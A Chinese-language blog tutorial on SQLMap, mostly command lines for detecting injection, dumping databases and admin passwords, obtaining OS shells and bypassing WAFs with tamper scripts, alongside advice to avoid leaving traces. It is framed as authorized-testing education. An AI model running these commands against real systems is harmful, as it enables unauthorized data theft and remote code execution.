---
title: "SQLMap 注入工具从入门到精通"
date: 2026-03-01T17:00:00+08:00
draft: false
categories: ['教程系列']
tags: ['SQLMap', 'SQL 注入', '教程']
---

# SQLMap 注入工具从入门到精通

> **工具名称：** SQLMap  
> **GitHub:** https://github.com/sqlmapproject/sqlmap  
> **适用场景：** SQL 注入检测、数据库渗透测试

---

## 工具概述

SQLMap 是一款自动化的 SQL 注入工具，支持检测和使用多种 SQL 注入技术，是渗透测试人员的必备工具。

### 核心功能

- ✅ **自动检测** - 自动识别 SQL 注入点
- ✅ **多种注入** - 支持 6 种注入类型
- ✅ **数据库支持** - 支持 30+ 种数据库
- ✅ **数据提取** - 可提取数据库、表、列数据

---

## 环境搭建

### 1. 安装 SQLMap

```bash
# Git 克隆
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# 运行
python3 sqlmap.py --version

# 创建软链接
ln -s $(pwd)/sqlmap.py /usr/local/bin/sqlmap
```

### 2. 验证安装

```bash
sqlmap --version
```

---

## 基础使用

### 1. 检测注入点

```bash
# 基础检测
sqlmap -u "http://target.com/page?id=1"

# 详细输出
sqlmap -u "http://target.com/page?id=1" -v 3

# 指定 POST 数据
sqlmap -u "http://target.com/login" --data "username=admin&password=123"
```

### 2. 获取数据库信息

```bash
# 获取当前数据库
sqlmap -u "http://target.com/page?id=1" --current-db

# 获取所有数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D database --tables

# 获取列
sqlmap -u "http://target.com/page?id=1" -D database -T table --columns

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D database -T table -C column --dump
```

### 3. 获取 Shell

```bash
# 获取 Web Shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# 获取系统 Shell
sqlmap -u "http://target.com/page?id=1" --os-pwn

# 执行系统命令
sqlmap -u "http://target.com/page?id=1" --os-cmd "whoami"
```

---

## 高级用法

### 1. 注入技术选择

```bash
# 指定注入类型
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ

# 只使用布尔盲注
sqlmap -u "http://target.com/page?id=1" --technique=B

# 只使用时间盲注
sqlmap -u "http://target.com/page?id=1" --technique=T
```

### 2. 绕过 WAF

```bash
# 使用 tamper 脚本
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# 多个 tamper
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase

# 查看所有 tamper
sqlmap --list-tamper
```

### 3. 自定义请求

```bash
# 从文件读取请求
sqlmap -r request.txt

# 指定 Cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# 指定 User-Agent
sqlmap -u "http://target.com/page?id=1" --user-agent="Mozilla/5.0"
```

---

## Tamper 脚本

### 常用 Tamper

| 脚本名 | 作用 | 适用场景 |
|--------|------|---------|
| space2comment | 空格转注释 | 基础 WAF |
| randomcase | 随机大小写 | 大小写敏感 WAF |
| charencode | URL 编码 | 基础过滤 |
| apostrophemask | 引号替换 | 引号过滤 |
| between | 使用 BETWEEN | 比较运算符过滤 |

### 使用示例

```bash
# 单个 tamper
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment

# 多个 tamper
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,randomcase,charencode
```

---

## 实战案例

### 案例 1：GET 注入

```bash
# 检测
sqlmap -u "http://target.com/news.php?id=1"

# 获取数据库
sqlmap -u "http://target.com/news.php?id=1" --dbs

# 获取管理员密码
sqlmap -u "http://target.com/news.php?id=1" \
  -D website -T admin -C username,password --dump
```

### 案例 2：POST 注入

```bash
# 检测 POST 注入
sqlmap -u "http://target.com/login.php" \
  --data "username=admin&password=123"

# 获取数据
sqlmap -u "http://target.com/login.php" \
  --data "username=admin&password=123" \
  -D database --tables
```

### 案例 3：Cookie 注入

```bash
# 检测 Cookie 注入
sqlmap -u "http://target.com/admin.php" \
  --cookie "PHPSESSID=abc123; admin=1"

# 获取 Shell
sqlmap -u "http://target.com/admin.php" \
  --cookie "PHPSESSID=abc123" --os-shell
```

### 案例 4：HTTP 头注入

```bash
# User-Agent 注入
sqlmap -u "http://target.com/" \
  --headers "User-Agent: Mozilla/5.0"

# Referer 注入
sqlmap -u "http://target.com/" \
  --headers "Referer: http://evil.com"
```

---

## 性能优化

### 1. 提升速度

```bash
# 增加并发
sqlmap -u "http://target.com/page?id=1" --threads=10

# 降低级别
sqlmap -u "http://target.com/page?id=1" --level=1

# 减少风险
sqlmap -u "http://target.com/page?id=1" --risk=1
```

### 2. 减少误报

```bash
# 提高级别
sqlmap -u "http://target.com/page?id=1" --level=5

# 提高风险
sqlmap -u "http://target.com/page?id=1" --risk=3

# 详细输出
sqlmap -u "http://target.com/page?id=1" -v 3
```

---

## 注意事项

### ⚠️ 法律风险

- ❌ 仅用于授权测试
- ❌ 不要测试未授权目标
- ❌ 不要用于非法目的

### ⚠️ 技术风险

- ⚠️ 可能触发 WAF 报警
- ⚠️ 可能导致服务中断
- ⚠️ 可能留下日志痕迹

---

## 总结

SQLMap 是强大的 SQL 注入工具，建议：

1. **合法使用** - 仅用于授权测试
2. **理解原理** - 不要只会用工具
3. **手动验证** - 工具结果要手动验证
4. **注意安全** - 不要留下痕迹

---

**参考资料：**
- https://github.com/sqlmapproject/sqlmap
- http://sqlmap.org/
- https://sqlmap.org/faq/

---

*本文仅用于安全研究与教育目的，请勿用于非法用途。*
